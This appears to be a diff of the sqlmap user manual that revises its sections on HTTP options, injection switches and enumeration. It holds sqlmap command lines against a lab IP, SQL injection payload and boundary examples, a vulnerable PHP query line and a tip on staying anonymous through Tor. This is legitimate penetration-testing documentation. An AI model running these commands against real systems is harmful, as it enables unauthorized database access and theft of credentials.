-[hh:mm:48] [INFO] testing connection to the target url
-[hh:mm:48] [TRAFFIC OUT] HTTP request:
-GET /sqlmap/mysql/get_int.php?id=1 HTTP/1.1
-Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
-Host: 192.168.136.131
-Accept-language: en-us,en;q=0.5
-Referer: http://www.google.com
-Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
-image/png,*/*;q=0.5
-User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
-Connection: close
-[...]
-</verb></tscreen>
+Note that also the HTTP <tt>Referer</tt> header is tested against SQL
+injection if the <tt>--level</tt> is set to <bf>3</bf> or above. See below
+for details.
 
 
 <sect2>Extra HTTP headers
 
 <p>
-Option: <tt>-</tt><tt>-headers</tt>
+Switch: <tt>-</tt><tt>-headers</tt>
 
 <p>
-It is possible to provide extra HTTP headers by providing <tt>-</tt><tt>-headers</tt>
-options. Each header must be separated by a newline and it's much easier
-to provide them from the configuration INI file. Have a look at the sample
-<tt>sqlmap.conf</tt> file.
+It is possible to provide extra HTTP headers by setting the
+<tt>-</tt><tt>-headers</tt> switch. Each header must be separated by a
+newline and it is much easier to provide them from the configuration INI
+file. Have a look at the sample <tt>sqlmap.conf</tt> file for an example.
 
 
 <sect2>HTTP <tt>Basic</tt>, <tt>Digest</tt> and <tt>NTLM</tt> authentications
 
 <p>
-Options: <tt>-</tt><tt>-auth-type</tt> and <tt>-</tt><tt>-auth-cred</tt>
+Switches: <tt>-</tt><tt>-auth-type</tt> and <tt>-</tt><tt>-auth-cred</tt>
 
 <p>
 These options can be used to specify which HTTP authentication type the
-web server implements and the valid credentials to be used to perfom all
+web server implements and the valid credentials to be used to perform all
 HTTP requests to the target application.
 The three valid types are <tt>Basic</tt>, <tt>Digest</tt> and <tt>NTLM</tt>,
 while the credentials' syntax is <tt>username:password</tt>.
 
 <p>
-Examples on a <bf>MySQL 5.0.67</bf> target:
+Example of valid syntax:
 
 <tscreen><verb>
 $ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1" \
-  --auth-type Basic --auth-cred "testuser:testpass" -v 3
-
-[...]
-[hh:mm:14] [INFO] testing connection to the target url
-[hh:mm:14] [TRAFFIC OUT] HTTP request:
-GET /sqlmap/mysql/basic/get_int.php?id=1 HTTP/1.1
-Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
-Host: 192.168.136.131
-Accept-language: en-us,en;q=0.5
-Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
-image/png,*/*;q=0.5
-Authorization: Basic dGVzdHVzZXI6dGVzdHBhc3M=
-User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
-Connection: close
-[...]
-
-
-$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/digest/get_int.php?id=1" \
-  --auth-type Digest --auth-cred "testuser:testpass" -v 3
-
-[...]
-[hh:mm:54] [INFO] testing connection to the target url
-[hh:mm:54] [TRAFFIC OUT] HTTP request:
-GET /sqlmap/mysql/digest/get_int.php?id=1 HTTP/1.1
-Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
-Host: 192.168.136.131
-Accept-language: en-us,en;q=0.5
-Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
-image/png,*/*;q=0.5
-Authorization: Digest username="testuser", realm="Testing digest authentication", 
-nonce="Qw52C8RdBAA=2d7eb362292b24718dcb6e4d9a7bf0f13d58fa9d", 
-uri="/sqlmap/mysql/digest/get_int.php?id=1", response="16d01b08ff2f77d8ff0183d706f96747", 
-algorithm="MD5", qop=auth, nc=00000001, cnonce="579be5eb8753693a"
-User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
-Connection: close
-[...]
+  --auth-type Basic --auth-cred "testuser:testpass"
 </verb></tscreen>
 
 
 <sect2>HTTP Certificate authentication
 
 <p>
-Option: <tt>-</tt><tt>-auth-cert</tt>
-
-This option should be used in cases when the web server requires proper user's 
-certificate for authentication. Supplied values should be in the form: <tt>key_file,
-cert_file</tt>, where <tt>key_file</tt> should be the name of a PEM formatted file that 
-contains your private key, while <tt>cert_file</tt> should be the name for a PEM formatted 
-certificate chain file.
+Switch: <tt>-</tt><tt>-auth-cert</tt>
 
 <p>
-Example:
+This switch should be used in cases when the web server requires proper
+client-side certificate for authentication. Supplied values should be in
+the form: <tt>key_file,cert_file</tt>, where <tt>key_file</tt> should be
+the name of a PEM formatted file that contains your private key, while
+<tt>cert_file</tt> should be the name for a PEM formatted certificate
+chain file.
 
-<tscreen><verb>
-$ python sqlmap.py -u "http://www.example.com/process.php?id=1" \
-  --auth-cert key.pem,cert.pem
-[...]
-</verb></tscreen>
 
-
-<sect2>HTTP proxy
-
-<p>
-Option: <tt>-</tt><tt>-proxy</tt> and <tt>-</tt><tt>-ignore-proxy</tt>
+<sect2>HTTP(S) proxy
 
 <p>
-It is possible to provide an anonymous HTTP proxy address to pass by the
-HTTP requests to the target URL. The syntax of HTTP proxy value is
-<tt>http://url:port</tt>.
+Switches: <tt>-</tt><tt>-proxy</tt>, <tt>-</tt><tt>-proxy-cred</tt> and <tt>-</tt><tt>-ignore-proxy</tt>
 
 <p>
-Example on a <bf>PostgreSQL 8.3.5</bf> target:
-
-<tscreen><verb>
-$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" \
-  --proxy "http://192.168.136.1:8080"
-
-[hh:mm:36] [WARNING] User-Agent parameter 'User-Agent' is not dynamic
-[hh:mm:36] [WARNING] GET parameter 'cat' is not dynamic
-[hh:mm:37] [WARNING] the back-end DMBS is not MySQL
-[hh:mm:37] [WARNING] the back-end DMBS is not Oracle
-back-end DBMS:    PostgreSQL
-</verb></tscreen>
+It is possible to provide an anonymous HTTP(S) proxy address to pass by
+the HTTP(S) requests to the target URL. The syntax of HTTP(S) proxy value
+is <tt>http://url:port</tt>.
 
 <p>
-Instead of using a single anonymous HTTP proxy server to pass by, you can
-configure a <htmlurl url="http://tor.eff.org" name="Tor client"> together
-with <htmlurl url="http://www.privoxy.org" name="Privoxy"> on your machine
-as explained on the <htmlurl url="http://tor.eff.org/docs/tor-doc-unix.html.en"
-name="Tor client guide"> then run sqlmap as follows:
-
-<tscreen><verb>
-$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" \
-  --proxy "http://192.168.136.1:8118"
-</verb></tscreen>
+You can also pass by your requests through an authenticated HTTP(S) proxy
+server, by providing the credentials in the format <tt>username:password</tt>
+to the <tt>-</tt><tt>-proxy-cred</tt> switch.
 
 <p>
-Note that <tt>8118</tt> is the default Privoxy port, adapt it to your
-settings.
+If, for any reason, you need to stay anonymous, instead of passing by a
+single known HTTP(S) proxy server, you can configure a <htmlurl
+url="http://www.torproject.org/" name="Tor client"> together with
+<htmlurl url="http://www.privoxy.org" name="Privoxy"> on your machine
+as explained on the Tor client guide and use the Privoxy daemon,
+by default listening on <tt>127.0.0.1:8118</tt>, as sqlmap proxy.
 
 <p>
-The option <tt>-</tt><tt>-ignore-proxy</tt> should be used in cases like
-when you want to run sqlmap against the machine inside a local area
-network skipping default usage of a system-wide set HTTP proxy server.
-
-
-<sect2>Concurrent HTTP requests
-
-<p>
-Option: <tt>-</tt><tt>-threads</tt>
-
-<p>
-It is possible to specify the number of maximum concurrent HTTP requests
-that sqlmap can start when it uses the blind SQL injection technique to
-retrieve the query output.
-This feature relies on the <htmlurl url="http://en.wikipedia.org/wiki/Multithreading"
-name="multithreading"> concept and inherits both its pro and its cons.
-
-<p>
-Examples on a <bf>MySQL 5.0.67</bf> target:
-
-<tscreen><verb>
-$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" -v 1 \
-  --current-user --threads 3
-
-[...]
-web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
-web application technology: PHP 5.2.6, Apache 2.2.9
-back-end DBMS: MySQL >= 5.0.0
-
-[hh:mm:18] [INFO] fetching current user
-[hh:mm:18] [INFO] retrieving the length of query output
-[hh:mm:18] [INFO] retrieved: 18
-[hh:mm:19] [INFO] starting 3 threads
-[hh:mm:19] [INFO] retrieved: testuser@localhost
-current user:    'testuser@localhost'
-</verb></tscreen>
-
-<p>
-As you can see, sqlmap first calculates the length of the query output,
-then starts three threads. Each thread is assigned to retrieve one
-character of the query output. The thread then ends after up to seven
-HTTP requests, the maximum requests to retrieve a query output character
-with the blind SQL injection bisection algorithm implemented in sqlmap.
-
-<p>
-Note that the multithreading option is not needed if the target is affected
-by an inband SQL injection vulnerability and the <tt>-</tt><tt>-union-use</tt>
-option has been provided.
+The switch <tt>-</tt><tt>-ignore-proxy</tt> should be used when you want
+to run sqlmap against a target part of a local area network skipping
+default usage of a system-wide set HTTP(S) proxy server.
 
 
 <sect2>Delay in seconds between each HTTP request
 
 <p>
-Option: <tt>-</tt><tt>-delay</tt>
+Switch: <tt>-</tt><tt>-delay</tt>
 
 <p>
-It is possible to specify a number of seconds to wait between each HTTP
-request. The valid value is a float, for instance 0.5 means half a second.
+It is possible to specify a number of seconds to wait between each HTTP(S)
+request. The valid value is a float, for instance <tt>0.5</tt> means half
+a second.
+By default, no delay is set.
 
 
 <sect2>Seconds to wait before timeout connection
 
 <p>
-Option: <tt>-</tt><tt>-timeout</tt>
+Switch: <tt>-</tt><tt>-timeout</tt>
 
 <p>
 It is possible to specify a number of seconds to wait before considering
-the HTTP request timed out. The valid value is a float, for instance
+the HTTP(S) request timed out. The valid value is a float, for instance
 10.5 means ten seconds and a half.
+By default 30 seconds are set.
 
 
 <sect2>Maximum number of retries when the HTTP connection timeouts
 
 <p>
-Option: <tt>-</tt><tt>-retries</tt>
+Switch: <tt>-</tt><tt>-retries</tt>
 
 <p>
-It is possible to specify the maximum number of retries when the HTTP
+It is possible to specify the maximum number of retries when the HTTP(S)
 connection timeouts. By default it retries up to three times.
 
 
 <sect2>Filtering targets from provided proxy log using regular expression
 
 <p>
-Option: <tt>-</tt><tt>-scope</tt>
+Switch: <tt>-</tt><tt>-scope</tt>
 
 <p>
-Rather than using all hosts parsed from provided logs with option 
-<tt>-l</tt>, in combination with this option you can specify valid 
-python regular expression to be used for filtering desired ones.
+Rather than using all hosts parsed from provided logs with switch 
+<tt>-l</tt>, you can specify valid Python regular expression to be used
+for filtering desired ones.
 
 Example usage:
 
 <tscreen><verb>
-$ python sqlmap.py -l /tmp/webscarab.log/conversations/ --scope="(www)?\.target\.(com|net|org)"
+$ python sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)"
 </verb></tscreen>
+
+
+<sect2>TODO
+
+<p>
+Switches: <tt>-</tt><tt>-safe-url</tt> and <tt>-</tt><tt>-safe-freq</tt>
+
+<p>
+TODO
+
+
+<sect1>Optimization
+
+<p>
+These options can be used to optimize the performance of sqlmap.
+
+
+<sect2>Bundle optimization
+
+<p>
+Switch: <tt>-o</tt>
+
+<p>
+TODO
+
+
+<sect2>Output prediction
+
+<p>
+Switch: <tt>-</tt><tt>-predict-output</tt>
+
+<p>
+TODO
+
+
+<sect2>HTTP Keep-Alive
+
+<p>
+Switch: <tt>-</tt><tt>-keep-alive</tt>
+
+<p>
+TODO
+
+
+<sect2>HTTP NULL connection
+
+<p>
+Switch: <tt>-</tt><tt>-null-connection</tt>
+
+<p>
+TODO
+
+
+<sect2>Concurrent HTTP(S) requests
+
+<p>
+Switch: <tt>-</tt><tt>-threads</tt>
+
+<p>
+It is possible to specify the maximum number of concurrent HTTP(S)
+requests that sqlmap is allowed to do.
+This feature relies on the <htmlurl url="http://en.wikipedia.org/wiki/Multithreading"
+name="multi-threading"> concept and inherits both its pro and its cons.
+
+<p>
+This number comes into play when the brute-force switches are provided or
+when the data fetching is done through any of the blind SQL injection
+techniques.
+For the latter case, sqlmap first calculates the length of the query
+output, then starts the threads. Each thread is assigned to retrieve one
+character of the query output. The thread then ends when that character is
+retrieved.
+
+<p>
+Note that the multi-threading switch does not affect any other SQL
+injection technique and that the maximum number of concurrent requests is
+set to <bf>10</bf> for performance and site reliability reasons.
+
+
+<sect2>MySQL GROUP_CONCAT() speed up
+
+<p>
+Switch: <tt>-</tt><tt>-group-concat</tt>
+
+<p>
+TODO
 
 
 <sect1>Injection
 
 <p>
 These options can be used to specify which parameters to test for, provide
-custom injection payloads and how to parse and compare HTTP responses page
-content when using the blind SQL injection technique.
+custom injection payloads and optional tampering scripts.
 
 
 <sect2>Testable parameter(s)
 
 <p>
-Option: <tt>-p</tt>
+Switch: <tt>-p</tt>
 
 <p>
-By default sqlmap tests all <tt>GET</tt> parameters, <tt>POST</tt>
-parameters, HTTP <tt>Cookie</tt> header values and HTTP <tt>User-Agent</tt>
-header value for dynamicity and SQL injection vulnerability, but it is
-possible to manually specify the parameter(s) you want sqlmap to perform
-tests on comma separeted in order to skip dynamicity tests and perform SQL
-injection test and inject directly only against the provided parameter(s).
-
-Example on a <bf>PostgreSQL 8.3.5</bf> target:
-
-<tscreen><verb>
-$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" -v 1 \
-  -p "id"
-
-[hh:mm:48] [INFO] testing connection to the target url
-[hh:mm:48] [INFO] testing if the url is stable, wait a few seconds
-[hh:mm:49] [INFO] url is stable
-[hh:mm:49] [INFO] testing if GET parameter 'id' is dynamic
-[hh:mm:49] [INFO] confirming that GET parameter 'id' is dynamic
-[hh:mm:49] [INFO] GET parameter 'id' is dynamic
-[hh:mm:49] [INFO] testing sql injection on GET parameter 'id'
-[hh:mm:49] [INFO] testing numeric/unescaped injection on GET parameter 'id'
-[hh:mm:49] [INFO] confirming numeric/unescaped injection on GET parameter 'id'
-[hh:mm:49] [INFO] GET parameter 'id' is numeric/unescaped injectable
-[hh:mm:49] [INFO] testing for parenthesis on injectable parameter
-[hh:mm:49] [INFO] the injectable parameter requires 0 parenthesis
-[...]
-</verb></tscreen>
+By default sqlmap tests all <tt>GET</tt> parameters and <tt>POST</tt>
+parameters. When the value of <tt>--level</tt> is >= <bf>2</bf> it tests
+also HTTP <tt>Cookie</tt> header values. When this value is >= <bf>3</bf>
+it tests also HTTP <tt>User-Agent</tt> and HTTP <tt>Referer</tt> header value for SQL injections.
+It is however possible to manually specify a comma-separated list of
+parameter(s) that you want sqlmap to test. This will bypass the dependence
+on the value of <tt>--level</tt> too.
 
 <p>
-Or, if you want to provide more than one parameter, for instance:
-
-<tscreen><verb>
-$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1&amp;cat=2" -v 1 \
-  -p "cat,id"
-</verb></tscreen>
-
-<p>
-You can also test only the HTTP <tt>User-Agent</tt> header.
-
-<p>
-Example on a <bf>MySQL 5.0.67</bf> target:
-
-<tscreen><verb>
-$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/ua_str.php" -v 1 \
-  -p "user-agent" --user-agent "sqlmap/0.8 (http://sqlmap.sourceforge.net)"
-
-[hh:mm:40] [WARNING] the testable parameter 'user-agent' you provided is not into the GET
-[hh:mm:40] [INFO] testing connection to the target url
-[hh:mm:40] [INFO] testing if the url is stable, wait a few seconds
-[hh:mm:41] [INFO] url is stable
-[hh:mm:41] [INFO] testing if User-Agent parameter 'User-Agent' is dynamic
-[hh:mm:41] [INFO] confirming that User-Agent parameter 'User-Agent' is dynamic
-[hh:mm:41] [INFO] User-Agent parameter 'User-Agent' is dynamic
-[hh:mm:41] [INFO] testing sql injection on User-Agent parameter 'User-Agent'
-[hh:mm:41] [INFO] testing numeric/unescaped injection on User-Agent parameter 'User-Agent'
-[hh:mm:41] [INFO] User-Agent parameter 'User-Agent' is not numeric/unescaped injectable
-[hh:mm:41] [INFO] testing string/single quote injection on User-Agent parameter 'User-Agent'
-[hh:mm:41] [INFO] confirming string/single quote injection on User-Agent parameter 'User-Agent'
-[hh:mm:41] [INFO] User-Agent parameter 'User-Agent' is string/single quote injectable
-[hh:mm:41] [INFO] testing for parenthesis on injectable parameter
-[hh:mm:41] [INFO] the injectable parameter requires 0 parenthesis
-[hh:mm:41] [INFO] testing MySQL
-[hh:mm:41] [INFO] retrieved: 44
-[hh:mm:41] [INFO] confirming MySQL
-[hh:mm:41] [INFO] retrieved: 1
-[hh:mm:41] [INFO] retrieved: 4
-web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
-web application technology: PHP 5.2.6, Apache 2.2.9
-back-end DBMS: MySQL >= 5.0.0
-</verb></tscreen>
+For instance, to test for GET parameter <tt>id</tt> and for HTTP
+<tt>User-Agent</tt> only, provide <tt>-p id,user-agent</tt>.
 
 
 <sect2>Force the database management system name
 
 <p>
-Option: <tt>-</tt><tt>-dbms</tt>
+Switch: <tt>-</tt><tt>-dbms</tt>
 
 <p>
 By default sqlmap automatically detects the web application's back-end
 database management system.
-At the moment, fully supported database management systems are:
+As of version <bf>0.9</bf>, sqlmap fully supports the following database
+management systems:
 
 <itemize>
 <item>MySQL
 <item>Oracle
 <item>PostgreSQL
 <item>Microsoft SQL Server
+<item>Microsoft Access
+<item>SQLite
+<item>Firebird
+<item>Sybase
+<item>SAP MaxDB
 </itemize>
 
 <p>
-It is possible to force the DBMS name if you already know it so that sqlmap
-will skip the fingerprint with an exception for MySQL and Microsoft SQL
-Server to only identify the version.
-To avoid also this check you can provide instead <tt>MySQL &lt;version&gt;</tt> or
-<tt>Microsoft SQL Server &lt;version&gt;</tt>, where &lt;version&gt; is a valid version for
-the DBMS; for instance <tt>5.0</tt> for MySQL and <tt>2005</tt> for
-Microsoft SQL Server.
-
-Example on a <bf>PostgreSQL 8.3.5</bf> target:
-
-<tscreen><verb>
-$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" -v 2 \
-  --dbms "PostgreSQL"
-
-[...]
-[hh:mm:31] [DEBUG] skipping to test for MySQL
-[hh:mm:31] [DEBUG] skipping to test for Oracle
-web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
-web application technology: PHP 5.2.6, Apache 2.2.9
-back-end DBMS:    PostgreSQL
-</verb></tscreen>
+If for any reason sqlmap fails to detect the back-end DBMS once a SQL
+injection has been identified or if you want to avoid an active fingeprint,
+you can provide the name of the back-end DBMS yourself (e.g. <tt>postgresql</tt>).
+For MySQL and Microsoft SQL Server provide them respectively in the form
+<tt>MySQL &lt;version&gt;</tt> and <tt>Microsoft SQL Server &lt;version&gt;
+</tt>, where <tt>&lt;version&gt;</tt> is a valid version for the DBMS; for
+instance <tt>5.0</tt> for MySQL and <tt>2005</tt> for Microsoft SQL Server.
 
 <p>
-In case you provide <tt>-</tt><tt>-fingerprint</tt> together with <tt>-</tt><tt>-dbms</tt>,
-sqlmap will only perform the extensive fingerprint for the specified
-database management system, read below for further details.
+In case you provide <tt>-</tt><tt>-fingerprint</tt> together with
+<tt>-</tt><tt>-dbms</tt>, sqlmap will only perform the extensive
+fingerprint for the specified database management system only, read below
+for further details.
 
 <p>
 Note that this option is <bf>not</bf> mandatory and it is strongly
 recommended to use it <bf>only if you are absolutely sure</bf> about the
 back-end database management system. If you do not know it, let sqlmap
-automatically identify it for you.
+automatically fingerprint it for you.
 
 
 <sect2>Force the database management system operating system name
 
 <p>
-Option: <tt>-</tt><tt>-os</tt>
+Switch: <tt>-</tt><tt>-os</tt>
 
 <p>
 By default sqlmap automatically detects the web application's back-end
-database management system underlying operating system when requested by
-any other functionality.
+database management system underlying operating system when this
+information is a dependence of any other provided switch.
 At the moment the fully supported operating systems are two:
 
 <itemize>
@@ -2008,8 +1494,8 @@ At the moment the fully supported operating systems are two:
 </itemize>
 
 <p>
-It is possible to force the operating system name if you already know it so
-that sqlmap will skip the fingerprint.
+It is possible to force the operating system name if you already know it
+so that sqlmap will avoid doing it itself.
 
 <p>
 Note that this option is <bf>not</bf> mandatory and it is strongly
@@ -2021,71 +1507,89 @@ not know it, let sqlmap automatically identify it for you.
 <sect2>Custom injection payload
 
 <p>
-Options: <tt>-</tt><tt>-prefix</tt> and <tt>-</tt><tt>-postfix</tt>
+Switches: <tt>-</tt><tt>-prefix</tt> and <tt>-</tt><tt>-suffix</tt>
 
 <p>
 In some circumstances the vulnerable parameter is exploitable only if the
-user provides a postfix to be appended to the injection payload.
+user provides a specific suffix to be appended to the injection payload.
 Another scenario where these options come handy presents itself when the
 user already knows that query syntax and want to detect and exploit the
-SQL injection by directly providing a injection payload prefix and/or
-postfix.
+SQL injection by directly providing a injection payload prefix and suffix.
 
 <p>
-Example on a <bf>MySQL 5.0.67</bf> target on a page where the SQL query is:
-<tt>$query = "SELECT * FROM users WHERE id=('" . $_GET['id'] . "') LIMIT 0, 1";</tt>:
+Example on vulnerable source code:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" -v 3 \
-  -p "id" --prefix "'" --postfix "AND 'test'='test"
+$query = "SELECT * FROM users WHERE id=('" . $_GET['id'] . "') LIMIT 0, 1";
+</verb></tscreen>
 
-[...]
-[hh:mm:16] [INFO] testing sql injection on GET parameter 'id' with 0 parenthesis
-[hh:mm:16] [INFO] testing custom injection on GET parameter 'id'
-[hh:mm:16] [TRAFFIC OUT] HTTP request:
-GET /sqlmap/mysql/get_str_brackets.php?id=1%27%29%20AND%207433=7433%20AND%20
-%28%27test%27=%27test HTTP/1.1
-Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
-Host: 192.168.136.131
-Accept-language: en-us,en;q=0.5
-Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
-image/png,*/*;q=0.5
-User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
-Connection: close
-[...]
-[hh:mm:17] [INFO] GET parameter 'id' is custom injectable 
+<p>
+To detect and exploit this SQL injection, you can either let sqlmap detect
+the <bf>boundaries</bf> (as in combination of SQL payload prefix and
+suffix) for you during the detection phase, or provide them on your own.
+For example:
+
+<tscreen><verb>
+$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" \
+  -p id --prefix "')" --suffix "AND ('abc'='abc"
 [...]
 </verb></tscreen>
 
 <p>
-As you can see, the injection payload for testing for custom injection is:
+This will result in all sqlmap requests to end up in a query as follows:
 
 <tscreen><verb>
-id=1%27%29%20AND%207433=7433%20AND%20%28%27test%27=%27test
+$query = "SELECT * FROM users WHERE id=('1') <PAYLOAD> AND ('abc'='abc') LIMIT 0, 1";
 </verb></tscreen>
 
-which URL decoded is:
-
-<tscreen><verb>
-id=1') AND 7433=7433 AND ('test'='test
-</verb></tscreen>
-
-and makes the query syntatically correct to the page query:
-
-<tscreen><verb>
-SELECT * FROM users WHERE id=('1') AND 7433=7433 AND ('test'='test') LIMIT 0, 1
-</verb></tscreen>
+<p>
+Which makes the query syntactically correct.
 
 <p>
 In this simple example, sqlmap could detect the SQL injection and exploit
-it without need to provide a custom injection payload, but sometimes in
-the real world application it is necessary to provide it.
+it without need to provide custom boundaries, but sometimes in real world
+application it is necessary to provide it when the injection point is
+within nested <tt>JOIN</tt> queries for instance.
+
+
+<sect2>Tamper injection data
+
+<p>
+Switch: <tt>-</tt><tt>-tamper</tt>
+
+<p>
+TODO
+
+
+<sect1>Detection
+
+<p>
+These options can be used to specify how to parse and compare page content
+from HTTP responses when using blind SQL injection technique.
+
+
+<sect2>Level
+
+<p>
+Switch: <tt>-</tt><tt>-level</tt>
+
+<p>
+TODO
+
+
+<sect2>Risk
+
+<p>
+Switch: <tt>-</tt><tt>-risk</tt>
+
+<p>
+TODO
 
 
 <sect2>Page comparison
 
 <p>
-Options: <tt>-</tt><tt>-string</tt> and <tt>-</tt><tt>-regexp</tt>
+Switches: <tt>-</tt><tt>-string</tt> and <tt>-</tt><tt>-regexp</tt>
 
 <p>
 By default the distinction of a True query by a False one (basic concept
@@ -2265,46 +1769,6 @@ with content that changes itself at each refresh without modifying the
 user's input</bf>.
 
 
-<sect2>Exclude specific page content
-
-<p>
-Options: <tt>-</tt><tt>-excl-str</tt> and <tt>-</tt><tt>-excl-reg</tt>
-
-<p>
-Another way to get around the dynamicity issue explained above is to exclude
-the dynamic part from the page content before processing it.
-
-<p>
-As you see in the above example the number after <tt>Dynamic content: </tt>
-was dynamic and changed each second. To get around of this problem we could
-use the above explained page comparison options or exclude this snippet of
-dynamic text from the page before processing it and comparing it with the
-not injected page.
-
-<tscreen><verb>
-$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int_refresh.php?id=1" \
-  --excl-reg "Dynamic content: ([\d]+)"
-
-[hh:mm:22] [INFO] testing connection to the target url
-[hh:mm:22] [INFO] testing if User-Agent parameter 'User-Agent' is dynamic
-[hh:mm:22] [WARNING] User-Agent parameter 'User-Agent' is not dynamic
-[hh:mm:22] [INFO] testing if GET parameter 'id' is dynamic
-[hh:mm:22] [INFO] confirming that GET parameter 'id' is dynamic
-[hh:mm:22] [INFO] GET parameter 'id' is dynamic
-[hh:mm:22] [INFO] testing sql injection on GET parameter 'id'
-[hh:mm:22] [INFO] testing numeric/unescaped injection on GET parameter 'id'
-[hh:mm:22] [INFO] confirming numeric/unescaped injection on GET parameter 'id'
-[hh:mm:22] [INFO] GET parameter 'id' is numeric/unescaped injectable
-[hh:mm:22] [INFO] testing for parenthesis on injectable parameter
-[hh:mm:22] [INFO] the injectable parameter requires 0 parenthesis
-[...]
-</verb></tscreen>
-
-<p>
-As you can see, when this options is specified, sqlmap skips the URL
-stability test.
-
-
 <sect1>Techniques
 
 <p>
@@ -2315,7 +1779,7 @@ the default blind SQL injection technique.
 <sect2>Test for stacked queries (multiple statements) support
 
 <p>
-Option: <tt>-</tt><tt>-stacked-test</tt>
+Switch: <tt>-</tt><tt>-stacked-test</tt>
 
 <p>
 It is possible to test if the web application technology supports
@@ -2379,7 +1843,7 @@ stacked queries support:    'name=luther'; WAITFOR DELAY '0:0:5';-- AND 'wRcBC'=
 <sect2>Test for time based blind SQL injection
 
 <p>
-Options: <tt>-</tt><tt>-time-test</tt> and <tt>-</tt><tt>-time-sec</tt>
+Switches: <tt>-</tt><tt>-time-test</tt> and <tt>-</tt><tt>-time-sec</tt>
 
 <p>
 It is possible to test if the target URL is affected by a <bf>time based
@@ -2454,7 +1918,7 @@ is set to five seconds.
 <sect2>Test for UNION query SQL injection
 
 <p>
-Options: <tt>-</tt><tt>-union-test</tt> and <tt>-</tt><tt>-union-tech</tt>
+Switches: <tt>-</tt><tt>-union-test</tt> and <tt>-</tt><tt>-union-tech</tt>
 
 <p>
 It is possible to test if the target URL is affected by a <bf>UNION query
@@ -2524,7 +1988,7 @@ with hundreds of HTTP requests.
 <sect2>Use the UNION query SQL injection
 
 <p>
-Option: <tt>-</tt><tt>-union-use</tt>
+Switch: <tt>-</tt><tt>-union-use</tt>
 
 <p>
 Providing the <tt>-</tt><tt>-union-use</tt> parameter, sqlmap will first test if
@@ -2696,7 +2160,7 @@ the page content.
 <sect2>Extensive database management system fingerprint
 
 <p>
-Options: <tt>-f</tt> or <tt>-</tt><tt>-fingerprint</tt>
+Switches: <tt>-f</tt> or <tt>-</tt><tt>-fingerprint</tt>
 
 <p>
 By default the web application's back-end database management system
@@ -2955,7 +2419,7 @@ you can run your own SQL statements.
 <sect2>Banner
 
 <p>
-Option: <tt>-b</tt> or <tt>-</tt><tt>-banner</tt>
+Switch: <tt>-b</tt> or <tt>-</tt><tt>-banner</tt>
 
 <p>
 Most of the modern database management systems have a function and/or 
@@ -3027,7 +2491,7 @@ Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86)
 <sect2>Session user
 
 <p>
-Option: <tt>-</tt><tt>-current-user</tt>
+Switch: <tt>-</tt><tt>-current-user</tt>
 
 <p>
 It is possible to retrieve the database management system's user which is
@@ -3046,7 +2510,7 @@ current user:    'testuser@localhost'
 <sect2>Current database
 
 <p>
-Option: <tt>-</tt><tt>-current-db</tt>
+Switch: <tt>-</tt><tt>-current-db</tt>
 
 <p>
 It is possible to retrieve the database management system's database the
@@ -3065,7 +2529,7 @@ current database:    'master'
 <sect2>Detect if the session user is a database administrator (DBA)
 
 <p>
-Option: <tt>-</tt><tt>-is-dba</tt>
+Switch: <tt>-</tt><tt>-is-dba</tt>
 
 <p>
 It is possible to detect if the current database management system session user is
@@ -3110,7 +2574,7 @@ current user is DBA:    'True'
 <sect2>Users
 
 <p>
-Option: <tt>-</tt><tt>-users</tt>
+Switch: <tt>-</tt><tt>-users</tt>
 
 <p>
 It is possible to enumerate the list of database management system users.
@@ -3131,7 +2595,7 @@ database management system users [3]:
 <sect2>Users password hashes
 
 <p>
-Options: <tt>-</tt><tt>-passwords</tt> and <tt>-U</tt>
+Switches: <tt>-</tt><tt>-passwords</tt> and <tt>-U</tt>
 
 <p>
 It is possible to enumerate the password hashes for each database
@@ -3206,7 +2670,7 @@ database management system users password hashes:
 <sect2>Users privileges
 
 <p>
-Options: <tt>-</tt><tt>-privileges</tt> and <tt>-U</tt>
+Switches: <tt>-</tt><tt>-privileges</tt> and <tt>-U</tt>
 
 <p>
 It is possible to enumerate the privileges for each database management
@@ -3339,7 +2803,7 @@ management system is Microsoft SQL Server.
 <sect2>Available databases
 
 <p>
-Option: <tt>-</tt><tt>-dbs</tt>
+Switch: <tt>-</tt><tt>-dbs</tt>
 
 <p>
 It is possible to enumerate the list of databases.
@@ -3366,7 +2830,7 @@ management system is Oracle.
 <sect2>Databases tables
 
 <p>
-Options: <tt>-</tt><tt>-tables</tt> and <tt>-D</tt>
+Switches: <tt>-</tt><tt>-tables</tt> and <tt>-D</tt>
 
 <p>
 It is possible to enumerate the list of tables for all database
@@ -3478,7 +2942,7 @@ system user.
 <sect2>Database table columns
 
 <p>
